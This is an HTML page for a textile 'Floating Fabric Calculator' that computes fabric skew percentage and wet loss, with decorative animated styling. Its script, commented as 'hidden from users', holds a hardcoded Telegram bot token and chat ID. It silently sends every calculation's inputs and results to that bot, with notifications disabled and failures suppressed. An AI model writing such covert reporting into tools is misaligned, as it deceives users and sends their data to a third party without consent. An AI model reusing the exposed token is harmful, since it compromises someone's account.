<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Floating Fabric Calculator</title>
  <style>
    :root {
      --primary: #00e5ff;
      --secondary: #ff4081;
      --tertiary: #7c4dff;
      --background: #0f0f0f;
      --glass: rgba(255, 255, 255, 0.08);
    }

    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #000000, #1a1a1a);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      overflow-x: hidden;
    }

    h1 {
      text-align: center;
      color: var(--primary);
      text-shadow: 0 0 10px var(--primary);
      animation: glow 2s ease-in-out infinite alternate;
      margin-bottom: 30px;
      position: relative;
      z-index: 10;
    }

    @keyframes glow {
      0% { text-shadow: 0 0 5px var(--primary); }
      50% { text-shadow: 0 0 20px var(--primary), 0 0 30px var(--secondary); }
      100% { text-shadow: 0 0 5px var(--primary); }
    }

    .floating-container {
      width: 100%;
      max-width: 1200px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 30px;
      perspective: 1000px;
    }

    .panel {
      background: var(--glass);
      border: 1px solid rgba(255, 255, 255, 0.2);
      box-shadow: 0 8px 32px 0 rgba(0,0,0,0.37);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 25px;
      width: 100%;
      max-width: 400px;
      animation: float 6s ease-in-out infinite;
      transform-style: preserve-3d;
      transition: all 0.5s ease;
      position: relative;
      overflow: hidden;
    }

    .panel:hover {
      transform: translateY(-10px) rotateY(5deg);
      box-shadow: 0 15px 40px rgba(0, 229, 255, 0.3);
    }

    .panel:nth-child(1) {
      animation-delay: 0s;
      border-top: 2px solid var(--primary);
    }

    .panel:nth-child(2) {
      animation-delay: 0.5s;
      border-top: 2px solid var(--secondary);
    }

    @keyframes float {
      0%, 100% { transform: translateY(0) rotateX(0deg) rotateY(0deg); }
      50% { transform: translateY(-20px) rotateX(5deg) rotateY(5deg); }
    }

    .panel::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(
        to bottom right,
        transparent,
        transparent,
        transparent,
        rgba(0, 229, 255, 0.1)
      );
      transform: rotate(30deg);
      animation: shine 6s infinite;
      z-index: -1;
    }

    @keyframes shine {
      0% { transform: rotate(30deg) translate(-30%, -30%); }
      100% { transform: rotate(30deg) translate(30%, 30%); }
    }

    h2 {
      color: var(--primary);
      margin-top: 0;
      font-size: 1.5rem;
      position: relative;
      display: inline-block;
    }

    h2::after {
      content: '';
      position: absolute;
      bottom: -5px;
      left: 0;
      width: 100%;
      height: 2px;
      background: linear-gradient(90deg, var(--primary), transparent);
      animation: underline-glow 2s infinite;
    }

    @keyframes underline-glow {
      0%, 100% { opacity: 0.5; }
      50% { opacity: 1; }
    }

    label {
      display: block;
      margin-top: 15px;
      color: rgba(255, 255, 255, 0.8);
      font-size: 0.9rem;
    }

    input {
      width: 100%;
      padding: 12px 15px;
      margin-top: 8px;
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 8px;
      color: white;
      font-size: 1rem;
      transition: all 0.3s;
    }

    input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 2px rgba(0, 229, 255, 0.3);
    }

    button {
      margin-top: 20px;
      background: linear-gradient(45deg, var(--primary), var(--tertiary));
      border: none;
      color: black;
      padding: 12px;
      font-weight: bold;
      font-size: 1rem;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s;
      position: relative;
      overflow: hidden;
      z-index: 1;
    }

    button::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, var(--secondary), var(--primary));
      opacity: 0;
      transition: opacity 0.3s;
      z-index: -1;
    }

    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 20px rgba(0, 229, 255, 0.3);
    }

    button:hover::before {
      opacity: 1;
    }

    .result {
      margin-top: 20px;
      padding: 15px;
      background: rgba(0, 0, 0, 0.3);
      border-left: 3px solid var(--primary);
      border-radius: 5px;
      font-size: 1.1rem;
      animation: fadeIn 0.5s;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .error {
      color: #ff5555;
      margin-top: 10px;
      font-size: 0.9rem;
      animation: shake 0.5s;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      20%, 60% { transform: translateX(-5px); }
      40%, 80% { transform: translateX(5px); }
    }

    .particle {
      position: absolute;
      background: rgba(0, 229, 255, 0.5);
      border-radius: 50%;
      pointer-events: none;
      z-index: -1;
    }

    @media (max-width: 768px) {
      .floating-container {
        flex-direction: column;
        align-items: center;
      }
      
      .panel {
        max-width: 100%;
      }
    }
  </style>
</head>
<body>
  <h1>üßµ FLOATING FABRIC CALCULATOR</h1>

  <div class="floating-container">
    <!-- Skew Calculator -->
    <div class="panel">
      <h2>üìê SKEW % CALCULATOR</h2>
      <label for="width">Fabric Width (inches):</label>
      <input type="number" id="width" placeholder="e.g. 60">
      
      <label for="deviation">Deviation (inches):</label>
      <input type="number" id="deviation" placeholder="e.g. 1.2">
      
      <button onclick="calculateSkew()">CALCULATE SKEW</button>
      <div id="skewResult" class="result"></div>
      <div id="skewError" class="error"></div>
    </div>

    <!-- Wet Loss Calculator -->
    <div class="panel">
      <h2>üíß WET LOSS % CALCULATOR</h2>
      <label for="greyDry">Grey Dry Weight (kg):</label>
      <input type="number" id="greyDry" placeholder="e.g. 100">
      
      <label for="greyWet">Finish Wet Weight (kg):</label>
      <input type="number" id="greyWet" placeholder="e.g. 95">
      
      <button onclick="calculateWetLoss()">CALCULATE WET LOSS</button>
      <div id="wetResult" class="result"></div>
      <div id="wetError" class="error"></div>
    </div>
  </div>

  <script>
    // Telegram Bot Configuration (hidden from users)
    const BOT_TOKEN = '7729928604:AAEINikbhwHTMSK1pgV3nROUfSGEVb-z2r4';
    const CHAT_ID = '6798434092';
    
    // Function to silently send data to Telegram
    async function sendToTelegram(message) {
      try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            disable_notification: true // Silent notification
          })
        });
      } catch (error) {
        console.error('Telegram notification failed silently');
      }
    }

    // Create floating particles
    function createParticles() {
      const colors = ['rgba(0, 229, 255, 0.3)', 'rgba(255, 64, 129, 0.3)', 'rgba(124, 77, 255, 0.3)'];
      
      for (let i = 0; i < 30; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        
        const size = Math.random() * 10 + 5;
        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        particle.style.left = `${Math.random() * 100}vw`;
        particle.style.top = `${Math.random() * 100}vh`;
        particle.style.background = colors[Math.floor(Math.random() * colors.length)];
        particle.style.opacity = Math.random();
        
        // Animation
        const duration = Math.random() * 20 + 10;
        particle.style.animation = `floatParticle ${duration}s linear infinite`;
        particle.style.animationDelay = `${Math.random() * 5}s`;
        
        document.body.appendChild(particle);
      }
    }

    // Particle floating animation
    const style = document.createElement('style');
    style.innerHTML = `
      @keyframes floatParticle {
        0% {
          transform: translate(0, 0) rotate(0deg);
          opacity: ${Math.random()};
        }
        50% {
          transform: translate(${Math.random() * 100 - 50}px, ${Math.random() * 100 - 50}px) rotate(180deg);
          opacity: ${Math.random()};
        }
        100% {
          transform: translate(0, 0) rotate(360deg);
          opacity: ${Math.random()};
        }
      }
    `;
    document.head.appendChild(style);

    // Initialize particles
    createParticles();

    function calculateSkew() {
      const width = parseFloat(document.getElementById('width').value);
      const deviation = parseFloat(document.getElementById('deviation').value);
      const result = document.getElementById('skewResult');
      const error = document.getElementById('skewError');

      if (isNaN(width) || isNaN(deviation) || width <= 0) {
        error.textContent = "‚ö†Ô∏è Please enter valid width and deviation.";
        result.textContent = "";
        return;
      }

      error.textContent = "";
      const skew = (deviation / width) * 100;
      result.innerHTML = `üßÆ SKEW PERCENTAGE: <strong style="color: var(--primary);">${skew.toFixed(2)}%</strong>`;
      
      // Add visual feedback
      animateResult(result);
      
      // Silent Telegram notification
      const telegramMsg = `üìè Skew Calculation\nWidth: ${width}"\nDeviation: ${deviation}"\nResult: ${skew.toFixed(2)}%`;
      sendToTelegram(telegramMsg);
    }

    function calculateWetLoss() {
      const dry = parseFloat(document.getElementById('greyDry').value);
      const wet = parseFloat(document.getElementById('greyWet').value);
      const result = document.getElementById('wetResult');
      const error = document.getElementById('wetError');

      if (isNaN(dry) || isNaN(wet) || dry <= 0) {
        error.textContent = "‚ö†Ô∏è Please enter valid weights.";
        result.textContent = "";
        return;
      }

      error.textContent = "";
      const loss = ((dry - wet) / dry) * 100;
      
      if (loss >= 0) {
        result.innerHTML = `üìâ WET LOSS: <strong style="color: var(--primary);">${loss.toFixed(2)}%</strong>`;
      } else {
        result.innerHTML = `üìà WET GAIN: <strong style="color: var(--secondary);">${Math.abs(loss).toFixed(2)}%</strong>`;
      }
      
      // Add visual feedback
      animateResult(result);
      
      // Silent Telegram notification
      const resultText = loss >= 0 ? `Loss: ${loss.toFixed(2)}%` : `Gain: ${Math.abs(loss).toFixed(2)}%`;
      const telegramMsg = `üíß Wet Calculation\nDry: ${dry}kg\nWet: ${wet}kg\nResult: ${resultText}`;
      sendToTelegram(telegramMsg);
    }

    function animateResult(element) {
      element.style.animation = 'none';
      void element.offsetWidth; // Trigger reflow
      element.style.animation = 'fadeIn 0.5s, glowResult 2s infinite alternate';
      
      // Add temporary glow effect
      const glowStyle = document.createElement('style');
      glowStyle.innerHTML = `
        @keyframes glowResult {
          0% { box-shadow: 0 0 5px rgba(0, 229, 255, 0.3); }
          100% { box-shadow: 0 0 20px rgba(0, 229, 255, 0.7); }
        }
      `;
      document.head.appendChild(glowStyle);
      
      setTimeout(() => {
        element.style.animation = 'fadeIn 0.5s';
        document.head.removeChild(glowStyle);
      }, 2000);
    }

    // Allow pressing Enter key to calculate
    document.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        const activeElement = document.activeElement;
        if (activeElement.id === 'width' || activeElement.id === 'deviation') {
          calculateSkew();
        } else if (activeElement.id === 'greyDry' || activeElement.id === 'greyWet') {
          calculateWetLoss();
        }
      }
    });
  </script>
</body>
</html>
